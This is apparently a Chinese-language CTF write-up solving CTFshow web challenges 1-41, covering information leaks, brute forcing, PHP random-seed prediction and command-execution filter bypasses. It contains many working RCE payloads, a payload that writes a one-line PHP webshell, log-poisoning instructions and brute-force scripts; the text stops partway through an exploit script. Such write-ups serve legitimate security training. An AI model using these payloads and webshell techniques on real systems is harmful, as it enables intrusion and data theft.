[{"content":"CTFshow_Web 信息收集：（完工） Web 1-5 查看网页源代码 抓个包看有没有藏东西 查看robots.txt phps源码泄露，访问index.phps，通过其源码泄露，在其中找到flag Web6 网页提示下载源码查看，访问url/www.zip得到源码文件\n解压文件我们得到\n打开fl00g.txt，没有我们想要的flag\n打开index.php\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-01 14:37:13 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-01 14:42:44 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13//flag in fl000g.txt 14echo \u0026#34;web6:where is flag?\u0026#34; 15?\u0026gt; 显示flag in fl00g.txt\n直接访问url/fl00g.txt得到flag\nweb7 git泄露，访问url/.git即可得到flag\nweb8 svn泄露，访问url/.git即可得到flag\nweb9 vim缓存信息泄露，访问url/index.php.swp，打开下载的index.php.swp即可得到flag\nweb10 根据hint查看cookie可以看到\ncookie:flag=ctfshow%7B3ac14c03-64d1-41aa-9328-c97bcceeb840%7D\n进行url解码即可得到flag\nweb11 域名解析\n我们可以通过nslookup来进行域名解析查询\nnslookup -qt=格式 URL nslookup -qt=any URL //遍历所有格式 nslookup -qt=TXT URL //查询txt格式 web12 hint：有时候网站上的公开信息，就是管理员常用密码\n先用dirsearch扫一下\n访问admin，要求我们输入管理员账号密码，根据后台路径我们可以猜测账号为admin\n回到主页，在网页的底部我们可以看到一个电话Help Line Number : 372619038\n猜测电话为管理员密码，输入后成功得到flag\nweb13 在页面底部可以看到一个document\n点击发现下载了一个document.pdf文件，文件里有后台的地址和账号密码\nd\n登录后台即可得到flag\nweb14 根据hint知道editor处应该有信息泄漏(虽然不知道什么是editor)\n我们先用dirsearch扫一下后台\n访问url/editor\n是一个文字编辑的页面，我们可以发现在上传附件📎出可以调用出到服务器的文件管理器\n在服务器的根目录没看到flag，尝试查看网站的根目录(var/www/html),看看有没有隐藏页面\n发现nothinghere文件夹中有个fl00g.txt文件\n访问url/nothinghere/f1000g.txt即可得到flag\nweb15 扫描到后台为url/admin，打开看到有个忘记密码，要求输入城市\n根据hint我们可以在主页底部找到一个qq邮箱，查询一下qq号\n得到信息，现居陕西西安\n输入西安成功重置密码，输入重置密码和帐号admin，成功得到flag\nWeb16 探针泄漏\ndirsearch 扫描不到这个探针，看wp才知道的\n探针在url/tz.php\n访问探针\n在指针里面可以找到phpinfo页面\n打开在phpinfo里面可以找到flag\nweb17 sql备份泄漏\n用dirsearch扫出来存在sql备份泄漏，下载backup.sql，打开得到flag\nweb18 本题是一个游戏，玩到101分就能得到flag\n我们直接看js\nFlappy_js.js\n审一下代码，我们可以看到当分数大于100的时候会输出这段文字，这段文字看着像unidcode编码，解码试试\n根据提示访问url/110.php,得到flag\nweb19 题目是一个登录的页面，根据hint查看网页源代码\n根据提示，这道题应该是一道对密码进行了加密的题目\n审阅一下代码我们得到这些信息\nmode模式： CBC padding 填充方式： ZeroPadding 密文输出编码： 十六进制hex 偏移量iv: ilove36dverymuch 密钥：0000000372619038 密文为： a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04\nAES 加密/解密 - 锤子在线工具\n用解密工具解密一下密文我们可以得到密码为\n输入密码，得到flag\nweb20 hint：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。\n这是一个使用access数据库的asp程序\n根据提示本题存在mdb文件泄露，那我们直接访问url/db/db.mdb\n下载db.mdb文件后用记事本打开搜索flag，即可得到 flag{ctfshow_old_database}\n爆破：（完工） web21 抓个包\n我们可以看到他的账号密码是通过base64编码加密后再发送的，问题不大\npayload设置如下\n我们还要设置一下payload处理\n开始爆破，根据长度或者状态码判断即可\nweb22 域名爆破\n通过爆破ctf.show的子域名可以爆破到flag.ctf.show\n访问即可得到flag(虽然已经挂了)\nweb23 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-03 11:43:51 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-03 11:56:11 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13error_reporting(0); 14 15include(\u0026#39;flag.php\u0026#39;); 16if(isset($_GET[\u0026#39;token\u0026#39;])){ 17 $token = md5($_GET[\u0026#39;token\u0026#39;]); 18 if(substr($token, 1,1)===substr($token, 14,1) \u0026amp;\u0026amp; substr($token, 14,1) ===substr($token, 17,1)){ 19 if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1))){ 20 echo $flag; 21 } 22 } 23}else{ 24 highlight_file(__FILE__); 25 26} 27?\u0026gt; 分析代码可知： 需要找到一个合适的 token 值，使得以下条件成立：\n1、md5(token) 的第 1 位（从 0 开始算）等于第 14 位\n2、md5(token) 的第 14 位等于第 17 位。\n3、md5(token) 的第 1 位的整数值、14 位的整数值、和 17 位的整数值的和除以第 1 位的整数值等于第 31 位的整数值。\n既然不知道怎么凑那我们可以尝试爆破\n通过bp爆破一下1-1000中是否有符合上述条件的字符串\n哎我草，怎么就爆破出来了，虽然不知道为什么纯数字还能爆出来\n其他解法，可以用大佬的脚本\n1# coding: utf-8 2# alberthao 3import hashlib 4 5dic = \u0026#39;0123456789qazwsxedcrfvtgbyhnujmikolp\u0026#39; 6for a in dic: 7 for b in dic: 8 t = str(a) + str(b) 9 md5 = hashlib.md5(t.encode(\u0026#39;utf-8\u0026#39;)).hexdigest() 10 # print md5 11 # print md5[1:2] 12 # print md5[14:15] 13 # print md5[17:18] 14 if md5[1:2] == md5[14:15] and md5[14:15] == md5[17:18]: 15 if (ord(md5[1:2])) \u0026gt;= 48 and ord(md5[1:2]) \u0026lt;= 57 and (ord(md5[14:15])) \u0026gt;= 48 and ord(md5[14:15]) \u0026lt;= 57: 16 if (ord(md5[17:18])) \u0026gt;= 48 and ord(md5[17:18]) \u0026lt;= 57 and (ord(md5[31:32])) \u0026gt;= 48 and ord( 17 md5[31:32]) \u0026lt;= 57: 18 if (int(md5[1:2]) + int(md5[14:15]) + int(md5[17:18])) / int(md5[1:2]) == int(md5[31:32]): 19 print(t) or\n1import hashlib 2for i in range(1,10000): 3 4md5 = hashlib.md5(str(i).encode(\u0026#39;utf-8\u0026#39;)).hexdigest() 5 6if md5[1] != md5[14] or md5[14]!= md5[17]: 7\tcontinue 8 9if(ord(md5[1]))\u0026gt;=48 and ord(md5[1])\u0026lt;=57 and (ord(md5[31]))\u0026gt;=48 and ord(md5[31])\u0026lt;=57: 10 11\tif((int(md5[1])+int(md5[14])+int(md5[17]))/int(md5[1])==int(md5[31])): 12 13\tprint(i) web24 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-03 13:26:39 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-03 13:53:31 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15include(\u0026#34;flag.php\u0026#34;); 16if(isset($_GET[\u0026#39;r\u0026#39;])){ 17 $r = $_GET[\u0026#39;r\u0026#39;]; 18 mt_srand(372619038); 19 if(intval($r)===intval(mt_rand())){ 20 echo $flag; 21 } 22}else{ 23 highlight_file(__FILE__); 24 echo system(\u0026#39;cat /proc/version\u0026#39;); 25} 26 27?\u0026gt; 这道题考察的是一个php伪随机数的题目\nmt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的\n虽然说是随机数，但是同一个种子会生成同一串数字\npoc\n1\u0026lt;?php 2mt_srand(372619038); 3echo intval(mt_rand()); 4?\u0026gt; 不知道跟版本有没有关系，我随便找的php在线运行，成功得到flag\nweb25 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-03 13:56:57 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-03 15:47:33 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15error_reporting(0); 16include(\u0026#34;flag.php\u0026#34;); 17if(isset($_GET[\u0026#39;r\u0026#39;])){ 18 $r = $_GET[\u0026#39;r\u0026#39;]; 19 mt_srand(hexdec(substr(md5($flag), 0,8))); 20 $rand = intval($r)-intval(mt_rand()); 21 if((!$rand)){ 22 if($_COOKIE[\u0026#39;token\u0026#39;]==(mt_rand()+mt_rand())){ 23 echo $flag; 24 } 25 }else{ 26 echo $rand; 27 } 28}else{ 29 highlight_file(__FILE__); 30 echo system(\u0026#39;cat /proc/version\u0026#39;); 31} 继续php伪随机数\n我们需要知道一个性质\n当mt_srand()中的种子是固定的，那么我们生成的随机数的序列就是相同的，如下\n1\u0026lt;?php 2 3mt_srand(1852100618); 4 5echo mt_rand(); 6echo mt_rand(); 7echo mt_rand(); 8echo mt_rand(); 9 10\u0026#39;\u0026#39;\u0026#39; 111640856123 121390302953 13893879251 14859994814 在这道题里面我们需要得到前三个随机数\n第一个随机数我们可以使r=0得到，第一个随机数为1640856123\n得到第一个随机数之后我们可以通过爆破的方式得到种子，从而得到第二，第三个随机数\nphp脚本(极其慢)\n1\u0026lt;?php 2$a= 390148868;//第一个随机数 3$b= 0 ; 4while (true){ 5 mt_srand($b); 6 if(mt_rand()==$a){ 7 echo \u0026#34;success:\u0026#34;+$b; 8 break; 9 } 10 echo $b; 11 echo \u0026#34;\\n\u0026#34;; 12 $b+=1; 13 14} 或者使用php_mt_seed-4.0工具\n我们可以看到不同版本的seed是不同的，我们一个个试试就行了\n1mt_srand(1852100618); 2echo mt_rand();// 第一次随机数（不能少） 3echo \u0026#34;\\ntoken：\u0026#34;; 4echo (mt_rand()+mt_rand()); //第二和第三次随机数相加，也就是我们要对token 得到token的值，我们只需要使rand为零即可得到flag\n也就是说我们只需要使r等于第一次随机数即可\n传参，得到flag\nweb26 这么多我咋爆，赌一把只爆密码\nweb27 这题是一个教务系统，需要通过账号密码登录\n先信息收集一下\n我们可以看到在账号密码下面有一个录取名单和学生学籍信息查询系统\n分别如上，那我们是否可以通过爆破学生的身份证信息从而通过录取查询查到学生的信息呢？\nbp抓个包\n哎我草，我数据呢\nforward一下（是因为数据实际上在checkdb.php才提交吗？不是很懂）\n我们可以发现其实身份证缺失的部分刚好是出生日期\n那我们可以用bp中的日期爆破功能\n爆出来的msg用unicode解码一下就能得到账号密码了\n贴个大佬的脚本\n1url=\u0026#39;https://bbc133e5-8f17-4c12-a7a2-88fecb9ac079.challenge.ctf.show/info/checkdb.php\u0026#39; NUM=32 2 3def run_tasks(L): U=[] for i in L: U.append(asyncio.ensure_future(i)) loop = asyncio.get_event_loop() loop.run_until_complete(asyncio.wait(U)) 4 5class TaskRuner: def init(self,n) -\u0026gt; None: self.L=[] for i in range(n): self.L.append(self.task_function(i)) self.task_num=n async def task_function(self,n): pass def run(self): run_tasks(self.L) self.on_over() def on_over(self): pass 6 7import aiohttp from urllib.parse import quote from datetime import date, timedelta 8 9class NYR: def init(self,start_date,end_date) -\u0026gt; None: self.start_date=start_date self.end_date=end_date self.delta = timedelta(days=1) self.current_date = start_date def next(self): t=self.current_date if t\u0026gt;self.end_date: return None self.current_date+=self.delta return t 10 11class Scanner(TaskRuner): def init(self,d1,d2,n) -\u0026gt; None: super().init(n) self.nyr=NYR(d1,d2) self.alive=True 12 13async def task_function(self, n): 14 while self.alive: 15 u=self.nyr.next() 16 if not u: 17 break 18 r=await self.login(u) 19 if r: 20 self.alive=False 21async def login(self,t:date): 22 url=\u0026#39;https://bbc133e5-8f17-4c12-a7a2-88fecb9ac079.challenge.ctf.show/info/checkdb.php\u0026#39; 23 n=t.year 24 y=t.month 25 r=t.day 26 n=str(n) 27 y=str(y) 28 r=str(r) 29 if len(y)==1: 30 y=\u0026#39;0\u0026#39;+y 31 if len(r)==1: 32 r=\u0026#39;0\u0026#39;+r 33 sfz=\u0026#39;621022\u0026#39;+n+y+r+\u0026#39;5237\u0026#39; 34 data={ 35 \u0026#39;a\u0026#39;:\u0026#39;高先伊\u0026#39;, 36 \u0026#39;p\u0026#39;:sfz, 37 } 38 sess=aiohttp.ClientSession() 39 try: 40 r=await sess.post(url=url,data=data,ssl=False) 41 text=await r.text() 42 js=loads(text) 43 msg=js[\u0026#39;msg\u0026#39;] 44 print(sfz,msg) 45 await sess.close() 46 return msg!=\u0026#39;提交信息有误\u0026#39; 47 except Exception as e: 48 print(e) 49 pass 50 try: 51 await sess.close() 52 except: 53 pass 54 return False 55 56async def handle_up(self,u,p): 57 pass 58a=Scanner(date(1990,1,1),date(2010,12,12),NUM) 59 60a.run() web28 这题本来不知道要干嘛\ndirsearch扫一下,感觉应该是目录爆破\n先爆破一下0-100\n命令执行： web29 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:26:48 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 可以看到通过eval函数可以执行php代码或者系统命令，其中过滤了flag。\n进行绕过就行，解法很多\nc=system(\u0026ldquo;cat fl*g.php | grep -E \u0026lsquo;fl.g\u0026rsquo; \u0026ldquo;);\nc=system(\u0026ldquo;tac fl*g.php\u0026rdquo;);\nc=system(\u0026ldquo;cat fl*g.php\u0026rdquo;);（用cat要右键查看源代码才能看到回显）\nc=system(\u0026ldquo;cp fl*g.php a.txt \u0026ldquo;);（访问a.txt查看）\nc=system(\u0026rsquo;echo -e \u0026quot; \u0026lt;?php \\n error_reporting(0); \\n $c= $_GET['c']; \\n eval($c); \u0026quot; \u0026gt; a.php\u0026rsquo;); //直接新建一个页面并写入一句话木马 （/a.php?c=system(\u0026ldquo;tac flag.php\u0026rdquo;);）\n?c=echo `tac fla*`;\n\u0026hellip;.\nweb30 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:42:26 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag|system|php/i\u0026#34;, $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 这里过滤了关键字flag，system还有php，由于过滤了system我们需要使用其他的系统函数进行命令执行\npayload:\nc=printf(exec(\u0026ldquo;cat%20fl*\u0026rdquo;));\nc=echo exec(\u0026ldquo;cat f\\lag.p\\hp\u0026rdquo;);\nc=show_source(scandir(\u0026rdquo;.\u0026rdquo;)[2]); (这个函数会返回一个包含当前目录下所有文件和目录项的数组)\nc=highlight_file(next(array_reverse(scandir(\u0026rdquo;.\u0026rdquo;))));\nc=passthru(\u0026ldquo;tac fla*\u0026rdquo;);\nc=echo `tac fla*`;\nc=$a=sys;$b=tem;$c=$a.$b;$c(\u0026ldquo;tac fla*\u0026rdquo;);*\nc=echo shell_exec(\u0026ldquo;tac fla*\u0026rdquo;);\nc=eval($_GET[1]);\u0026amp;1=system(\u0026ldquo;tac flag.php\u0026rdquo;);\nc=passthru(base64_decode(\u0026ldquo;Y2F0IGZsYWcucGhw==\u0026rdquo;));(base64绕过)\n\u0026hellip;\u0026hellip;\nweb31 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:49:10 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;/i\u0026#34;, $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 这题屏蔽了关键词 /flag|system|php|cat|sort|shell|.| |'\npayload:\nc=eval($_GET[1]);\u0026amp;1=system(\u0026ldquo;tac flag.php\u0026rdquo;); c=show_source(scandir(getcwd())[2]); c=show_source(next(array_reverse(scandir(pos(localeconv()))))); c=passthru(\u0026ldquo;tac%09fla*\u0026rdquo;); c=echo`tac%09fla*`; web32 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:56:31 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(/i\u0026#34;, $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 这题屏蔽了关键词 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(\n过滤了空格可以用${IFS}和%0a 代替，分号可以用?\u0026gt;代替\n用include构造payload：\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\n得到的结果用base64解码一下就可以得到flag了\n或者用日志注入：\nurl/?c=include$_GET[1]?%3E\u0026amp;1=../../../../var/log/nginx/access.log /var/log/nginx/access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可\nweb33 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 02:22:27 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12// 13error_reporting(0); 14if(isset($_GET[\u0026#39;c\u0026#39;])){ 15 $c = $_GET[\u0026#39;c\u0026#39;]; 16 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\\u0026#34;/i\u0026#34;, $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽的关键词比上一题多了个双引号 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|\u0026quot;\n继续使用include构造payload：\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb34 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 04:21:29 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET[\u0026#39;c\u0026#39;])){ 15 $c = $_GET[\u0026#39;c\u0026#39;]; 16 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\:|\\\u0026#34;/i\u0026#34;, $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽的关键词 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\u0026quot;\n继续使用include构造payload：\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb35 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 04:21:23 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET[\u0026#39;c\u0026#39;])){ 15 $c = $_GET[\u0026#39;c\u0026#39;]; 16 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\:|\\\u0026#34;|\\\u0026lt;|\\=/i\u0026#34;, $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽关键词 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\u0026quot;|\u0026lt;|=\n继续使用include构造payload：（wsm还能秒）\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb36 1\u0026lt;?php 2 3/* 4\\# -*- coding: utf-8 -*- 5\\# @Author: h1xa 6\\# @Date: 2020-09-04 00:12:34 7\\# @Last Modified by: h1xa 8\\# @Last Modified time: 2020-09-04 04:21:16 9\\# @email: h1xa@ctfer.com 10\\# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET[\u0026#39;c\u0026#39;])){ 15 $c = $_GET[\u0026#39;c\u0026#39;]; 16 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\:|\\\u0026#34;|\\\u0026lt;|\\=|\\/|[0-9]/i\u0026#34;, $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽关键字 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\u0026quot;|\u0026lt;|=|/|[0-9]\n不是哥们，数字也要屏蔽，那我改一下不就好了\n继续使用include构造payload：\nurl/?c=include$_GET[m]?\u0026gt;\u0026amp;m=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[m]?\u0026gt;\u0026amp;m=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb37 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 05:18:55 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ 18 include($c); 19 echo $flag; 20 21 } 22 23}else{ 24 highlight_file(__FILE__); 25} 不是哥们，怎么还是文件包含\npayload：\n?c=data://text/plain,\u003c?php system(\"tac fla*.php\")?\u003e\n或者\n?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=\nweb38 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 05:23:36 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag|php|file/i\u0026#34;, $c)){ 18 include($c); 19 echo $flag; 20 21 } 22 23}else{ 24 highlight_file(__FILE__); 25} payload:\n?c=data://text/plain,\u003c?=system(\"tac%20fla*\")?\u003e\n或者\n?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=\nweb39 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 06:13:21 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ 18 include($c.\u0026#34;.php\u0026#34;); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 这里会在我们传入的c后面拼接一段.php\n我们只需要在加入\u003c?php ?\u003e那么php就只会执行中间的代码，后面的内容不会执行\n故payload：\n?c=data://text/plain,\u003c?php system(\"tac fla*.php\")?\u003e\nweb40 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 06:03:36 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13 14if(isset($_GET[\u0026#39;c\u0026#39;])){ 15 $c = $_GET[\u0026#39;c\u0026#39;]; 16 if(!preg_match(\u0026#34;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\\u0026#39;|\\\u0026#34;|\\,|\\\u0026lt;|\\.|\\\u0026gt;|\\/|\\?|\\\\\\\\/i\u0026#34;, $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽关键词 /[0-9]|~|`|@|#|\\$|%|^|\u0026amp;|*|\\（|\\）|-|=|+|{|[|]|}|:|'|\u0026quot;|,|\u0026lt;|.|\u0026gt;|/|?|\\\\\n这里要使用无参命令执行\npayload：\n?c=show_source(next(array_reverse(scandir(pos(localeconv())))));\n关于无参命令执行的一些解释\nweb41 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: 羽 6# @Date: 2020-09-05 20:31:22 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:40:07 9# @email: 1341963450@qq.com 10# @link: https://ctf.show 11 12*/ 13 14if(isset($_POST[\u0026#39;c\u0026#39;])){ 15 $c = $_POST[\u0026#39;c\u0026#39;]; 16if(!preg_match(\u0026#39;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026amp;|\\-/i\u0026#39;, $c)){ 17 eval(\u0026#34;echo($c);\u0026#34;); 18 } 19}else{ 20 highlight_file(__FILE__); 21} 22?\u0026gt; 过滤内容：/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026amp;|\\-/i\n这个题过滤了$、+、-、^、~使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符|。 我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。\n大佬的脚本\n1\u0026lt;?php 2$myfile = fopen(\u0026#34;rce_or.txt\u0026#34;, \u0026#34;w\u0026#34;); 3$contents=\u0026#34;\u0026#34;; 4for ($i=0; $i \u0026lt; 256; $i++) { 5\tfor ($j=0; $j \u0026lt;256 ; $j++) { 6 7\tif($i\u0026lt;16){ 8\t$hex_i=\u0026#39;0\u0026#39;.dechex($i); 9\t} 10\telse{ 11\t$hex_i=dechex($i); 12\t} 13\tif($j\u0026lt;16){ 14\t$hex_j=\u0026#39;0\u0026#39;.dechex($j); 15\t} 16\telse{ 17\t$hex_j=dechex($j); 18\t} 19\t$preg = \u0026#39;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026amp;|\\-/i\u0026#39;; 20\tif(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){ 21\techo \u0026#34;\u0026#34;; 22 } 23 24\telse{ 25\t$a=\u0026#39;%\u0026#39;.$hex_i; 26\t$b=\u0026#39;%\u0026#39;.$hex_j; 27\t$c=(urldecode($a)|urldecode($b)); 28\tif (ord($c)\u0026gt;=32\u0026amp;ord($c)\u0026lt;=126) { 29\t$contents=$contents.$c.\u0026#34; \u0026#34;.$a.\u0026#34; \u0026#34;.$b.\u0026#34;\\n\u0026#34;; 30\t} 31\t} 32 33} 34} 35fwrite($myfile,$contents); 36fclose($myfile); 1# -*- coding: utf-8 -*- 2import requests 3import urllib 4from sys import * 5import os 6os.system(\u0026#34;php rce_or.php\u0026#34;) #没有将php写入环境变量需手动运行 7if(len(argv)!=2): 8 print(\u0026#34;=\u0026#34;*50) 9 print(\u0026#39;USER：python exp.py \u0026lt;url\u0026gt;\u0026#39;) 10 print(\u0026#34;eg： python exp.py http://ctf.show/\u0026#34;) 11 print(\u0026#34;=\u0026#34;*50) 12 exit(0) 13url=argv[1] 14def action(arg): 15 s1=\u0026#34;\u0026#34; 16 s2=\u0026#34;\u0026#34; 17 for i in arg: 18 f=open(\u0026#34;rce_or.txt\u0026#34;,\u0026#34;r\u0026#34;) 19 while True: 20 t=f.readline() 21 if t==\u0026#34;\u0026#34;: 22 break 23 if t[0]==i: 24 #print(i) 25 s1+=t[2:5] 26 s2+=t[6:9] 27 break 28 f.close() 29 